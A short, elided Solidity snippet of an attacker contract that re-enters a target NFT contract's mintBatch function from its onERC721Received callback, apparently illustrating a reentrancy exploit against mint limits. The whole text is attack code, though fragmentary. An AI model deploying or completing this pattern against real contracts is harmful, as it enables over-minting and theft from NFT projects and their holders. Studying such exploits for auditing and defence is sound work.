...
contract attackerMintNFT is ERC721Holder {
  ...
  function onERC721Received(address sender, address from, uint256 tokenId, bytes memory data) public override returns (bytes4){
    (bool success, ) = contractToAttack.call{value: 0.0005 ether}(abi.encodeWithSignature("mintBatch(uint256)", 5));
  ...
  function attack() public {
    ...
    (bool sucess, ) = contractToAttack.call{value: 0.0005 ether}(abi.encodeWithSignature("mintBatch(uint256)", 5));
  }
